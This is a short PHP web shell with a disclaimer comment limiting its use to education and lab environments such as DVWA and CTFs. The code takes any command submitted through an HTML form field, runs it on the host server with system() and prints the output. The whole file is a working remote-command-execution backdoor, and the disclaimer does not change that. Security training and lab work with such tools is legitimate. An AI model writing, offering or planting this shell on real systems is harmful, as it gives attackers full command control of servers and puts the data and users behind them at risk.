<?php
/*
 * DISCLAIMER:
 * This PHP shell is intended **only for educational purposes**,
 * penetration testing on systems you own, or in controlled environments
 * like DVWA, Hack The Box, or CTF labs.
 * Unauthorized use on public or private servers is illegal and punishable by law.
 */
?>


<?php
if(isset($_POST["cmd"])){
    echo "<pre>";
    system($_POST["cmd"]);
    echo "</pre>";
}
?>
<form method="post">
    <input type="text" name="cmd" placeholder="Command:" style="width:300px;">
    <input type="submit" value="Run">
</form>
